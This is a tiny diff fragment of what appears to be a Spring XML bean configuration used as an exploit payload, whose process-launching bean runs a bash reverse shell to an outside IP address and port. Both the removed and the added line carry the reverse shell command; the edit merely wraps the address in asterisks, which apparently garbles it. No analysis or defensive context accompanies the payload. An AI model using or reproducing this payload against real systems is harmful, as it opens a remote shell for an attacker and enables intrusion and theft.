@@ -8,7 +8,7 @@
             <list>
                 <value>bash</value>
                 <value>-c</value>
-                <value>bash -i >& /dev/tcp/18.140.32.61/2511 0>&1</value>
+                <value>bash -i >& /dev/tcp/**18.140.32.61/2511** 0>&1</value>
             </list>
             </constructor-arg>
         </bean>
